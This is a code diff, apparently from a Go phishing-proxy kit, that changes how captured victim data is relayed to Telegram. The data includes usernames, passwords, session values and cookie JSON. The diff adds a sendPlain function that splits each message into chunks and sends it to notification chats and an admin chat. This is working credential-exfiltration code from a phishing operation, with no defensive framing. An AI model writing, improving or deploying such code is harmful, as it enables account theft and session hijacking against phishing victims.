@@ -943,7 +943,7 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		uname, pass, sessionVal, cookieJSON)
 
 	for chatId := range notifyChats {
-		GlobalBot.send(chatId, msg)
+		GlobalBot.sendPlain(chatId, msg)
 	}
 }
 
@@ -1009,7 +1009,7 @@ func NotifySessionFromDB(sess *database.Session) {
 		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
 		uname, pass, sessionVal, cookieJSON)
 
-	GlobalBot.send(adminChatId, msg)
+	GlobalBot.sendPlain(adminChatId, msg)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -1071,6 +1071,21 @@ func (b *TelegramBot) send(chatId int64, text string) {
 		m.ParseMode = "Markdown"
 		if _, err := b.api.Send(m); err != nil {
 			log.Error("telegram bot: send chunk to %d: %v", chatId, err)
+		}
+	}
+}
+
+func (b *TelegramBot) sendPlain(chatId int64, text string) {
+	const maxLen = 4096
+	for len(text) > 0 {
+		chunk := text
+		if len(chunk) > maxLen {
+			chunk = text[:maxLen]
+		}
+		text = text[len(chunk):]
+		m := tgbotapi.NewMessage(chatId, chunk)
+		if _, err := b.api.Send(m); err != nil {
+			log.Error("telegram bot: send to %d: %v", chatId, err)
 		}
 	}
 }
